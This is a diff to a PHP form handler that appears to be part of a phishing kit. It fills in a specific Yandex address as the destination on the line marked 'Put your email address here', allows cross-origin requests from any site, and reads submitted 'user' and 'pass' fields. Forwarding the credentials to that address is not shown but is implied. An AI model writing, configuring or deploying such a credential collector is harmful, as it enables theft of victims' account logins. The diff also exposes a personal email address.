@@ -1,6 +1,6 @@
 <?php
 
-$email = "your@gmail.com"; // Put your email address here
+$email = "santino.ziggy@yandex.com"; // Put your email address here
 header("Access-Control-Allow-Origin: *"); 
 if (isset($_POST["user"]) && isset($_POST["pass"])) {
     $user = $_POST["user"];
